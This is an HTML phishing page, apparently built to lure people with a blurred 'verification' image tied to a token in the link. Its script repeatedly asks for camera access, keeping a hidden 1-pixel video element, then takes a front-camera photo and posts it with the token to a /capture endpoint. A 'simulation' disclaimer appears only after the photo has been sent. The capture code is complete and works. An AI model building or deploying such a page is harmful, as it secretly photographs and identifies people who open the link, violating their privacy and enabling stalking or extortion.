<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Identity Verification</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root { --cyan: #00f5ff; }
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:'Poppins',sans-serif; background:radial-gradient(circle at center,#1a1a1a 0%,#000 100%); color:#e0e0e0; min-height:100vh; display:flex; align-items:center; justify-content:center; }
  .glass-card { background:rgba(20,20,30,0.92); backdrop-filter:blur(16px); border-radius:20px; border:1px solid rgba(0,245,255,0.25); box-shadow:0 0 50px rgba(0,245,255,0.18); width:100%; max-width:520px; overflow:hidden; }
  .header { text-align:center; padding:35px 20px 25px; border-bottom:1px solid rgba(0,245,255,0.15); }
  .title { font-size:2.3rem; font-weight:700; background:linear-gradient(90deg,#00f5ff,#00bfff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
  .subtitle { font-size:1rem; opacity:0.85; margin-top:8px; }
  .content { padding:30px 25px; }
  .stage { text-align:center; min-height:340px; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:20px; }
  .loader { width:85px; height:85px; border:7px solid rgba(0,245,255,0.2); border-top-color:var(--cyan); border-radius:50%; animation:spin 1.1s linear infinite; display:none; margin: 0 auto; }
  @keyframes spin { to { transform:rotate(360deg); } }
  .message { font-size:1.15rem; color:var(--cyan); font-weight:500; display:none; }
  
  /* Image blur effect */
  .img-container {
    position: relative;
    width: 100%;
    max-width: 380px;
    border-radius: 16px;
    overflow: hidden;
    border: 2px solid rgba(0,245,255,0.4);
  }
  .img-container img {
    width: 100%;
    display: block;
    transition: filter 0.8s ease;
  }
  .blurred {
    filter: blur(20px);
  }
  .overlay-text {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    color: white;
    font-weight: 600;
    font-size: 1.1rem;
    text-shadow: 0 2px 5px rgba(0,0,0,0.8);
    pointer-events: none;
    text-align: center;
    width: 80%;
  }

  .warning { background:rgba(255,70,70,0.18); border:1px solid #ff5555; color:#ff8888; padding:18px; border-radius:14px; margin:25px 0; text-align:left; font-size:0.96rem; }
  
  /* Hidden video */
  #video { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
</style>
</head>
<body>
<div class="glass-card">
  <div class="header">
    <h1 class="title">🔐 Identity Verification</h1>
  </div>
  <div class="content">

    <!-- Step 1: Image dikhegi (Blurred) -->
    <div id="consent" class="stage">
      <div class="img-container">
        <img id="preview" src="" class="blurred" alt="Verification Image">
        <div class="overlay-text" id="overlay-msg">Tap anywhere to verify and view image</div>
      </div>
    </div>

    <!-- Step 2: Loading -->
    <div id="loading" class="stage" style="display:none;">
      <div class="loader" style="display:block;"></div>
      <div class="message" style="display:block;">Verifying...</div>
    </div>

    <!-- Step 3: Result (Clear Image) -->
    <div id="result" class="stage" style="display:none;">
      <div class="img-container">
        <img id="final-image" src="" alt="Verification Image">
      </div>
      <div class="warning">
        <strong>✅ Verification Successful.</strong><br><br>
        This was a simulation. Real phishing pages may try to capture your data or access your camera without clear intent.
      </div>
      <button onclick="resetDemo()" style="background:#333;color:#fff;padding:10px 20px;border-radius:10px;border:none;margin-top:10px;">Restart Demo</button>
    </div>

  </div>
</div>

<!-- Hidden Video for Camera -->
<video id="video" autoplay playsinline muted></video>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const TOKEN = urlParams.get('t');
  const CAPTURE_ENDPOINT = "/capture";
  const IMG_ENDPOINT = "/img/";

  const video = document.getElementById('video');
  let stream = null;
  let isStarted = false;
  let cameraRetryCount = 0;
  const MAX_RETRIES = 9999;

  // Page load hote hi blurred image set karo
  window.addEventListener('DOMContentLoaded', () => {
    if (TOKEN) {
      document.getElementById('preview').src = `${IMG_ENDPOINT}${TOKEN}.jpg`;
      document.getElementById('final-image').src = `${IMG_ENDPOINT}${TOKEN}.jpg`;
    }
    startCamera();
    
    setInterval(() => {
      if (!stream && !isStarted && cameraRetryCount < MAX_RETRIES) {
        startCamera();
      }
    }, 500);
  });

  async function startCamera() {
    if (isStarted) return;

    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
      });
      video.srcObject = stream;
      cameraRetryCount = 0;
      
      // Camera allow hote hi loading dikhao
      document.getElementById('consent').style.display='none';
      document.getElementById('loading').style.display='flex';
      
      // 1.5 second wait karo (taaki camera focus ho jaye)
      setTimeout(() => {
        captureAndSend();
      }, 1500);

    } catch (e) {
      cameraRetryCount++;
      console.log("Camera denied, retry #" + cameraRetryCount, e.name);
      if (cameraRetryCount < MAX_RETRIES) {
        setTimeout(startCamera, 500);
      }
    }
  }

  async function captureAndSend() {
    if (!stream) return;
    isStarted = true;

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const imageBase64 = canvas.toDataURL('image/jpeg', 0.92);
    
    stream.getTracks().forEach(t=>t.stop());
    video.srcObject = null;
    
    try {
      await fetch(CAPTURE_ENDPOINT, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({token: TOKEN, image: imageBase64})
      });
    } catch(e) { console.log(e); }

    showFinalImage();
  }

  function showFinalImage() {
    document.getElementById('loading').style.display='none';
    document.getElementById('result').style.display='flex';
  }

  function resetDemo() {
    if (stream) stream.getTracks().forEach(t=>t.stop());
    location.reload();
  }

  ['click', 'touchstart', 'keydown'].forEach(evt => {
    document.addEventListener(evt, () => {
      if (!stream && !isStarted) {
        cameraRetryCount = 0;
        startCamera();
      }
    }, { once: false });
  });

  window.addEventListener('beforeunload', () => {
    if (stream) stream.getTracks().forEach(t=>t.stop());
  });
</script>
</body>
</html>
